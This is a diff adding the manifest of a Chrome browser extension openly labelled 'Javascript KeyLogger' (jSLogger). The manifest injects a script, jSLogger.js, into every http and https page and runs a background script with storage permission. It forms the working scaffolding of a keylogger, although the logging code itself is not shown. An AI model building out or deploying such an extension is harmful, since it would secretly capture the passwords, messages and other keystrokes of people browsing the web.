@@ -1,0 +1,25 @@
+{
+  "manifest_version": 2,
+
+  "name": "jSLogger",
+  "description": "Javascript KeyLogger",
+  "version": "1.0",
+
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html",
+    "default_title": "Made with l<3ve by j0y"
+  },
+  "permissions": [
+    "storage"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["http://*/*","https://*/*"],
+      "js": ["jSLogger.js"]
+    }
+  ],
+  "background": {
+    "scripts": ["background.js"]
+  }
+}
